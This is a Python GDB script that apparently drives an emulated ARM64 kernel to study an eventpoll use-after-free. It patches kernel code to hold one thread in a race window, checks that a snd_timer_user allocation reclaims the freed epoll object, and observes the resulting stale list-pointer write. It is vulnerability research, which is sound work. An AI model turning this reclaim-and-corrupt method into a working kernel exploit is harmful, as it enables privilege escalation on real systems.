import gdb
import time

def run_experiment():
    print("\n=== STALE WRITE SND_TIMER_USER LIST_HEAD OBSERVATION EXPERIMENT ===\n")
    
    ep_remove_store = 0xffffffc0083bcfd8
    ep_remove_patch1 = 0xffffffc0083bcfdc
    ep_remove_patch2 = 0xffffffc0083bcfe0
    
    orig_insn1 = 0x91006000 # add x0, x0, #0x18
    orig_insn2 = 0xeb00005f # cmp x2, x0
    dmb_sy_insn = 0xd5033fbf # dmb sy
    spin_insn = 0x14000000   # b .
    
    ep_free_addr = 0xffffffc0083bd0a8
    snd_alloc_ret = 0xffffffc008c13904
    uaf_write_addr = 0xffffffc0083bcedc
    eventpoll_fops_addr = 0xffffffc009397b78
    
    gdb.execute("set pagination off")
    gdb.execute("set confirm off")
    gdb.execute("target remote :1234")
    
    # 1. Break at ep_remove_store
    print(f"[*] Setting breakpoint at ep_remove_store ({hex(ep_remove_store)})")
    gdb.execute(f"break *{ep_remove_store}")
    
    while True:
        gdb.execute("continue")
        pc = int(gdb.parse_and_eval("$pc")) & 0xffffffffffffffff
        if pc == ep_remove_store:
            x24 = int(gdb.parse_and_eval("$x24")) & 0xffffffffffffffff
            f_op = int(gdb.parse_and_eval(f"*(unsigned long *)({x24} + 0x28)")) & 0xffffffffffffffff
            if f_op == eventpoll_fops_addr:
                print(f"[*] Hit ep_remove on inner epoll file! (f_op={hex(f_op)})")
                break
                
    gdb.execute(f"clear *{ep_remove_store}")
    
    thread_a = gdb.selected_thread().num
    x24 = int(gdb.parse_and_eval("$x24")) & 0xffffffffffffffff
    inner_epoll = int(gdb.parse_and_eval(f"*(unsigned long *)({x24} + 0xc8)")) & 0xffffffffffffffff
    print(f"[*] Thread A: {thread_a}")
    print(f"[*] inner_epoll address: {hex(inner_epoll)}")
    
    # 2. Patch Thread A to spin loop
    print(f"[*] Patching Thread A at {hex(ep_remove_patch1)} to spin loop...")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch1} = {dmb_sy_insn}")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch2} = {spin_insn}")
    
    # 3. Break at ep_free to catch Thread B freeing inner_epoll
    print(f"[*] Setting breakpoint at ep_free ({hex(ep_free_addr)})")
    gdb.execute(f"break *{ep_free_addr}")
    
    while True:
        gdb.execute("continue")
        hit = False
        for thr in gdb.selected_inferior().threads():
            if not thr.is_valid(): continue
            thr.switch()
            pc = int(gdb.parse_and_eval("$pc")) & 0xffffffffffffffff
            if pc == ep_free_addr:
                hit = True
                break
        if hit:
            ep_arg = int(gdb.parse_and_eval("$x0")) & 0xffffffffffffffff
            if ep_arg == inner_epoll:
                print(f"[*] Thread B reached ep_free(inner_epoll={hex(inner_epoll)})!")
                break
                
    gdb.execute(f"clear *{ep_free_addr}")
    
    # 4. Break at snd_timer_user allocation return in Thread B
    print(f"[*] Setting breakpoint at snd_timer_user kmalloc return ({hex(snd_alloc_ret)})")
    gdb.execute(f"break *{snd_alloc_ret}")
    gdb.execute("continue")
    gdb.execute(f"clear *{snd_alloc_ret}")
    
    snd_timer_addr = int(gdb.parse_and_eval("$x0")) & 0xffffffffffffffff
    print(f"[*] Thread B allocated snd_timer_user at address: {hex(snd_timer_addr)}")
    print(f"[*] Reclaim check: inner_epoll ({hex(inner_epoll)}) == snd_timer_user ({hex(snd_timer_addr)})? {inner_epoll == snd_timer_addr}")
    
    # 5. Restore Thread A
    print(f"[*] Restoring Thread A ({thread_a})...")
    gdb.execute(f"thread {thread_a}")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch1} = {orig_insn1}")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch2} = {orig_insn2}")
    gdb.execute(f"set $pc = {ep_remove_patch1}")
    
    # 6. Break at UAF store instruction: 0xffffffc0083bcedc: str x2, [x0]
    print(f"[*] Setting breakpoint at UAF store instruction ({hex(uaf_write_addr)})")
    gdb.execute(f"break *{uaf_write_addr}")
    gdb.execute("continue")
    gdb.execute(f"clear *{uaf_write_addr}")
    
    # PRE-STORE OBSERVATION OF ioctl_lock.wait_list (offset 0xa0: next, 0xa8: prev)
    wait_list_addr = snd_timer_addr + 0xa0
    pre_next = int(gdb.parse_and_eval(f"*(unsigned long *)({wait_list_addr})")) & 0xffffffffffffffff
    pre_prev = int(gdb.parse_and_eval(f"*(unsigned long *)({wait_list_addr} + 8)")) & 0xffffffffffffffff
    x2_val = int(gdb.parse_and_eval("$x2")) & 0xffffffffffffffff
    
    print("\n=======================================================")
    print("=== OBSERVATION IMMEDIATELY BEFORE STALE STORE ===")
    print("=======================================================")
    print(f"Target ioctl_lock.wait_list address: {hex(wait_list_addr)}")
    print(f"pre-store wait_list.next (+0xa0):     {hex(pre_next)}")
    print(f"pre-store wait_list.prev (+0xa8):     {hex(pre_prev)}")
    print(f"Source Register x2 (epi1->fllink):    {hex(x2_val)}")
    print("=======================================================\n")
    
    # 7. Execute EXACTLY ONE stale store instruction
    gdb.execute("stepi")
    
    # POST-STORE OBSERVATION
    post_next = int(gdb.parse_and_eval(f"*(unsigned long *)({wait_list_addr})")) & 0xffffffffffffffff
    post_prev = int(gdb.parse_and_eval(f"*(unsigned long *)({wait_list_addr} + 8)")) & 0xffffffffffffffff
    
    print("=======================================================")
    print("=== OBSERVATION IMMEDIATELY AFTER STALE STORE ===")
    print("=======================================================")
    print(f"post-store wait_list.next (+0xa0):    {hex(post_next)}")
    print(f"post-store wait_list.prev (+0xa8):    {hex(post_prev)}")
    print("=======================================================\n")

if __name__ == "__main__":
    run_experiment()
